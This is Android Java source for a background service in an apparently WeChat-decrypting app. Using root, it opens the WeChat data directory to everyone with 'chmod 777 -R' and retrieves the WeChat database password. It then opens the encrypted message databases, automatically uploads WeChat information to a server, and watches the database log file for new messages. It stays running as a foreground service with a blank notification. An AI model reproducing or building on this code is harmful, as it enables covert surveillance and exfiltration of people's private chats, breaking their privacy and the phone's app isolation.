package com.wx.decrypt.service;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.wx.db.decryptkey.DecryptUtiles;
import com.wx.decrypt.network.util.Base64Util;
import com.wx.decrypt.request.WxRequestManager;
import com.wx.decrypt.threadpool.ThreadPoolManager;
import com.wx.decrypt.util.SPHelper;
import com.wx.decrypt.wxdb.EnMicroMsgDBManager;
import com.wx.decrypt.wxdb.FileIndexDBManager;

import java.io.IOException;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledThreadPoolExecutor;

import static com.wx.decrypt.constant.DBConstant.ENMICROMSG_DB_NAME;
import static com.wx.decrypt.constant.DBConstant.FILE_INDEX_DB_NAME;
import static com.wx.decrypt.constant.DBConstant.WX_DB_DIR_PATH;
import static com.wx.decrypt.constant.DBConstant.WX_DB_WAL_FILE_NAME;
import static com.wx.decrypt.constant.DBConstant.WX_ROOT_PATH;

/**
 * @author xutao
 */
public class DBWorkService extends Service {

    DBObserver mDBObserver;
    ScheduledExecutorService mPool = new ScheduledThreadPoolExecutor(1);

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ThreadPoolManager.getInstance().execute(new Runnable() {
            @Override
            public void run() {
                initDb();
                startForegroundService();
                uploadWxInfo();
                startObserverWxDB();

                try {
                    Base64Util.test();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

//        mPool.scheduleAtFixedRate(new TimerTask() {
//            @Override
//            public void run() {
//                System.out.println("Service work");
//            }
//        }, 0, 2000, TimeUnit.MILLISECONDS);
        return Service.START_STICKY;
    }

    private void initDb() {
        //获取root权限
        DecryptUtiles.execRootCmd("chmod 777 -R " + WX_ROOT_PATH);
        String pwd = DecryptUtiles.getDbPassword(this);
        String uidPath = DecryptUtiles.getWxUidPath();
        try {
            String enMicroMsgPath = WX_DB_DIR_PATH +"/"+ uidPath + "/" + ENMICROMSG_DB_NAME;
            String fileIndexPath = WX_DB_DIR_PATH +"/"+ uidPath + "/" + FILE_INDEX_DB_NAME;
            EnMicroMsgDBManager.getInstance().init(enMicroMsgPath, pwd);
            FileIndexDBManager.getInstance().init(fileIndexPath, pwd);
        } catch (Exception e) {
            Log.e("path", e.getMessage());
            e.printStackTrace();
        }
    }

    private void uploadWxInfo() {
        if (SPHelper.getInstance().getCanAutoUploadWxInfo()) {
            //自动上传一次微信信息
            ThreadPoolManager.getInstance().execute(new Runnable() {
                @Override
                public void run() {
                    WxRequestManager.getInstance().uploadWxInfo();
                }
            });
        }
    }

    private void startObserverWxDB() {
        String walPath = WX_DB_DIR_PATH +"/"+ DecryptUtiles.getWxUidPath() + "/" + WX_DB_WAL_FILE_NAME;
        //设置监听wal文件变化
        mDBObserver = new DBObserver(walPath);
        if (mDBObserver != null) {
            mDBObserver.startWatching();
        }
    }

    private void stopObserverWxDB() {
        if (mDBObserver != null) {
            mDBObserver.stopWatching();
        }
    }

    private void startForegroundService() {
        //使用前台服务
        Notification notification = new Notification();
        //当一个Service被当作Foreground来运行的时候，就不会因为内存不足而被销毁
        startForeground(13169, notification);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopObserverWxDB();
        FileIndexDBManager.getInstance().closeDB();
        EnMicroMsgDBManager.getInstance().closeDB();
    }
}
